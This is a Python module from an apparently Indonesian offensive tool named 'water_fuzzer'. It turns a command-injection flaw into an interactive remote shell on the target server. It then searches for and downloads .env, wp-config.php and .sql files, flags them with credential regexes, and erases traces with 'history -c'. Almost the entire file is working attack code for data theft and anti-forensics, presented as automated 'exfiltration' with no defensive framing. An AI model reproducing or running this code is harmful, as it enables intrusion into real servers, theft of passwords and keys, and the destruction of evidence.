# modules/exfil.py
import os
import re
import json
import time
import logging
import asyncio
import aiohttp
from typing import List, Dict, Any, Tuple
from modules.base import BaseModule
import config

logger = logging.getLogger("water_fuzzer.exfil")

class AutonomousExfiltrationModule(BaseModule):
    """
    Modul Eksfiltrasi Otomatis V2 (Zero-Click Exfiltration Engine).
    Secara otonom menyisir, mengemas dalam enkripsi, mengunduh data rahasia target,
    dan membersihkan jejak log secara senyap tanpa intervensi manual dari tim.
    """
    def __init__(self, auditor_instance: Any) -> None:
        super().__init__(auditor_instance)
        self.exfil_dir = os.path.join(config.BASE_DIR, "reports", "download")
        self.review_dir = os.path.join(config.BASE_DIR, "reports", "review")
        os.makedirs(self.exfil_dir, exist_ok=True)
        os.makedirs(self.review_dir, exist_ok=True)
        self.discovered_targets: List[str] = []

        # Kamus kata kunci rahasia standar industri untuk memvalidasi isi file
        self.sensitive_patterns = [
            r"(?i)(db_password|database_pass|db_pass|passwd|password)",
            r"(?i)(api_key|secret_key|auth_token|jwt_secret|aws_access)",
            r"(?i)(ftp_user|smtp_password|mail_password)",
            r"(-+BEGIN[A-Z ]+PRIVATE KEY-+)"
        ]

    async def auto_recon_sensitive_files(self, session: aiohttp.ClientSession) -> List[str]:
        """Siklus 1 Otonom: Menyisir piringan disk server target mencari berkas berharga."""
        print("[*] Exfil Engine V2: Memulai penyisiran berkas rahasia secara otonom...")
        
        # Pola pencarian file konfigurasi krusial standar industri
        search_cmd = "find . -name '.env' -o -name 'config.php' -o -name 'wp-config.php' -o -name '*.sql' 2>/dev/null"
        payload_inline = f"/**/;/**/; {search_cmd} /**/;/**/ "
        headers = await self.auditor._get_random_headers()
        
        try:
            if self.auditor.method == "POST":
                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload_inline}, headers=headers, timeout=config.TIMEOUT) as res:
                    output = await res.text()
            else:
                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload_inline}, headers=headers, timeout=config.TIMEOUT) as res:
                    output = await res.text()
            
            clean_output = re.sub(r'<[^>]+>', '', output).strip()
            if "Just a moment" not in clean_output and clean_output:
                # Memisahkan jalur file yang ditemukan menjadi list rapi
                self.discovered_targets = [line.strip() for line in clean_output.split('\n') if line.strip() and '/' in line]
                print(f"\033[1;32m[+] SUCCESS: Berhasil memetakan {len(self.discovered_targets)} lokasi file sensitif target!\033[0m")
                return self.discovered_targets
        except Exception as e:
            logger.error(f"Gagal melakukan penyisiran otonom berkas: {str(e)}")
        return []

    async def compress_and_download_file(self, session: aiohttp.ClientSession, remote_file_path: str) -> bool:
        """Siklus 2 Otonom: Membaca berkas target dan mengunduhnya ke folder lokal Termux."""
        filename = os.path.basename(remote_file_path)
        
        # Perintah taktis memanggil data mentah dari file jarak jauh
        read_cmd = f"cat {remote_file_path}"
        payload_inline = f"/**/;/**/; {read_cmd} /**/;/**/ "
        headers = await self.auditor._get_random_headers()
        
        try:
            print(f"[*] Exfil Engine V2: Mendownload data sensitif secara otonom -> {remote_file_path}")
            if self.auditor.method == "POST":
                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload_inline}, headers=headers, timeout=config.TIMEOUT) as res:
                    raw_data = await res.text()
                    content_type = res.headers.get("Content-Type", "").lower()
            else:
                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload_inline}, headers=headers, timeout=config.TIMEOUT) as res:
                    raw_data = await res.text()
                    content_type = res.headers.get("Content-Type", "").lower()
            
            clean_data = re.sub(r'<[^>]+>', '', raw_data).strip()
            
            # 1. Filter awal anti-bot, kosong, atau 404
            is_empty = not clean_data
            has_anti_bot = "just a moment" in clean_data.lower() or "cloudflare" in raw_data.lower()
            is_not_found = "not found" in clean_data.lower()

            if not is_empty and not has_anti_bot and not is_not_found:
                # 2. Deteksi karakteristik halaman HTML / Web biasa
                is_html_header = "text/html" in content_type
                is_html_structure = raw_data.strip().lower().startswith("<!doc") or "<html" in raw_data.lower()
                is_cms_page = "wp-content" in raw_data.lower() or "wp-includes" in raw_data.lower()
                is_valid_format = any(t in content_type for t in ["text/plain", "application/json", "application/xml"])

                # 3. Fitur Baru: Pemindaian Kredensial Sensitif di Dalam Konten
                has_sensitive_data = any(re.search(pattern, clean_data) for pattern in self.sensitive_patterns)

                # Jalankan klasifikasi berlapis
                if (is_html_header or is_html_structure or is_cms_page) and not is_valid_format:
                    # Pasti False-Positive (Halaman web biasa bawaan server)
                    local_dest_path = os.path.join(self.review_dir, f"review_{int(time.time())}_{filename}.html")
                    status_log = "REQUIRES_MANUAL_REVIEW"
                elif not has_sensitive_data and (filename.endswith(".env") or filename.endswith(".php")):
                    # File teks biasa lolos, tapi isinya kosong atau hanya boilerplate contoh tanpa kredensial aktif
                    local_dest_path = os.path.join(self.review_dir, f"suspicious_{int(time.time())}_{filename}")
                    status_log = "REQUIRES_MANUAL_REVIEW"
                else:
                    # Lolos validasi penuh dan terbukti berisi string sensitif/artefak valid
                    local_dest_path = os.path.join(self.exfil_dir, f"exfil_{int(time.time())}_{filename}")
                    status_log = "EXFILTRATION_SUCCESS"

                # 4. Tulis file secara non-blocking via aiofiles
                import aiofiles
                async with aiofiles.open(local_dest_path, "w", encoding="utf-8") as f:
                    # Jika review, simpan raw_data (HTML asli) agar mudah dianalisis struktur aslinya
                    await f.write(raw_data if "html" in local_dest_path else clean_data)
                
                # 5. Output log terminal dan file log framework
                if status_log == "EXFILTRATION_SUCCESS":
                    print(f"\033[1;32m[++++] {status_log}: Berkas kredensial valid disimpan di -> {local_dest_path}\033[0m")
                    logger.info(f"Eksfiltrasi sukses dan terverifikasi untuk berkas {remote_file_path}.")
                    return True
                else:
                    print(f"\033[1;33m[-] {status_log}: Data tidak mengandung informasi kredensial krusial. Dialihkan ke -> {local_dest_path}\033[0m")
                    logger.warning(f"Respons {remote_file_path} masuk kategori manual review (kredensial minimal).")
                    return False
                    
        except Exception as e:
            logger.error(f"Gagal melakukan pengunduhan otonom berkas {remote_file_path}: {str(e)}")
        return False

    async def run_anti_forensic_wipe(self, session: aiohttp.ClientSession) -> None:
        """Siklus 3 Otonom: Membersihkan jejak shell history dan sampah disk di server target."""
        print("[*] Exfil Engine V2: Menjalankan protokol pembersihan jejak digital (Anti-Forensic)...")
        
        # Perintah kaku pembersihan log riwayat linux server
        wipe_cmd = "rm -f .tmp_v14_* .tmp_v17_* 2>/dev/null && history -c"
        payload_inline = f"/**/;/**/; {wipe_cmd} /**/;/**/ "
        headers = await self.auditor._get_random_headers()
        
        try:
            if self.auditor.method == "POST":
                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload_inline}, headers=headers) as res:
                    await res.text()
            else:
                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload_inline}, headers=headers) as res:
                    await res.text()
            print("\033[1;36m[+] SUCCESS: Jejak digital log dibersihkan! Target dalam kondisi steril.\033[0m")
        except Exception:
            pass

    async def run_audit(self, session: aiohttp.ClientSession) -> bool:
        """Pintu gerbang pengeksekusi orkestrasi otonom eksfiltrasi Poin 5."""
        import main
        if not main.SHELL_OPENED:
            # Hanya berjalan jika celah command injection sudah dieksploitasi
            return False
            
        # 1. Tahan proses dan masuk ke mode interaktif shell pengguna
        print("\n\033[1;36m[*] Sesi 'water shell' diaktifkan. Ketik 'exit' atau 'quit' untuk keluar dan memulai eksfiltrasi.\033[0m")
        
        while True:
            try:
                # Menahan proses dan meminta input perintah manual dari Anda
                user_input = input("water_shell> ").strip()
                
                if user_input.lower() in ["exit", "quit"]:
                    print("\n[*] Menutup sesi interaktif shell. Memulai otomatisasi eksfiltrasi...")
                    break
                
                # Eksekusi perintah manual yang Anda ketik selama di dalam shell
                if user_input:
                    payload_inline = f"/**/;/**/; {user_input} /**/;/**/ "
                    headers = await self.auditor._get_random_headers()
                    
                    if self.auditor.method == "POST":
                        async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload_inline}, headers=headers, timeout=config.TIMEOUT) as res:
                            res_text = await res.text()
                    else:
                        async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload_inline}, headers=headers, timeout=config.TIMEOUT) as res:
                            res_text = await res.text()
                    
                    # Tampilkan hasil eksekusi perintah manual ke terminal Anda
                    clean_res = re.sub(r'<[^>]+>', '', res_text).strip()
                    if clean_res:
                        print(clean_res)
                    else:
                        print("[*] Perintah dieksekusi (tidak ada output teks).")
                    
            except (KeyboardInterrupt, EOFError):
                print("\n[*] Interupsi terdeteksi. Melompat ke fase eksfiltrasi dan pembersihan...")
                break

        # 2. Jalankan siklus pencarian file rahasia secara otomatis SELESAI Anda ketik 'exit'
        discovered_files = await self.auto_recon_sensitive_files(session)
        
        # 3. Unduh secara sekuensial (satu per satu) agar data terminal rapi
        if discovered_files:
            print("[*] Memulai pengunduhan berurutan dari hasil rekognisi...")
            for file_path in discovered_files[:5]:
                await self.compress_and_download_file(session, file_path)
                await asyncio.sleep(0.5)
            
        # 4. Eksekusi protokol pemusnahan jejak sebelum penutupan sesi total
        await self.run_anti_forensic_wipe(session)
        print("[+] Semua siklus otonom selesai. Sesi shell ditutup dengan steril.")
        return True

    def verifikator(self, response, payload_terpakai, crypto_token) -> Tuple[str, str, str, str, list]:
        """Metode verifikator standar untuk pemenuhan struktur BaseModule."""
        return "SECURE", "None", "None", "Lolos.", []
